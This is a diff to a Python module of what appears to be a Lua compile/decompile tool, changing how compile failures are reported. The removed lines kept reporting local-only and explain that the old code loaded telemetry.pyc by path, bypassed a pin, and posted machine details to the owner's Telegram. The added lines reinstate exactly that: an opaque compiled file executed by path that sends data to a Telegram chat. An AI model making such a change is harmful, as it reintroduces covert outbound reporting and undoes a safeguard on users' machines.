@@ -57,31 +57,33 @@ if _legacy is not None:
             continue
         globals()[_n] = getattr(_legacy, _n)
 
-# ---- graceful-failure -> local log ---------------------------------------
-# The compiled menu only alerts on *raised* exceptions (report_error /
-# report_unluac_error).  A clean compile/decompile that returns (ok=False,
-# msg) never raises, so a real failure leaves no trace at all.  These hooks
-# record it once per failed job, in the local action log.
-#
-# This used to load telemetry.pyc straight off disk and post the machine to
-# the owner's Telegram. That file is gone. Loading it by path also bypassed
-# sys.modules, so the pin in ikram_patch never applied. The logger is now
-# imported as a module like anything else, which is both local-only and
-# actually reachable.
+# ---- graceful-failure -> Telegram reporting -----------------------------
+# The compiled menu only Telegram-alerts on *raised* exceptions (report_error
+# / report_unluac_error).  A clean compile/decompile that returns (ok=False,
+# msg) never raises, so the owner never learns a real failure happened.  These
+# two hooks fire send_error exactly once per failed job, in a background
+# thread (telemetry already threads), bounded in size so Telegram never gets a
+# megastring.
+_TEL_SPEC = str(_PYC.parent / "telemetry.pyc")
+
+
 def _telemetry():
     try:
-        import telemetry as _tel
-        return _tel
+        import importlib.util as _ilu
+        _s = _ilu.spec_from_file_location("_tel_report", _TEL_SPEC)
+        _m = _ilu.module_from_spec(_s)
+        _s.loader.exec_module(_m)
+        return _m
     except Exception:
         return None
 
 
 def _notify_failure(operation: str, src, msg: str, limit=800) -> None:
-    """Record a graceful failure in the local action log.
+    """Send a graceful-failure notice to the owner's Telegram chat.
 
     Fires only on actual failures (empty msg is skipped).  `src` may be a
-    path/name; `msg` is truncated so one runaway compiler message cannot
-    fill the log.
+    path/name; `msg` is truncated so the payload stays inside Telegram's 4096
+    char limit.
     """
     if not msg:
         return
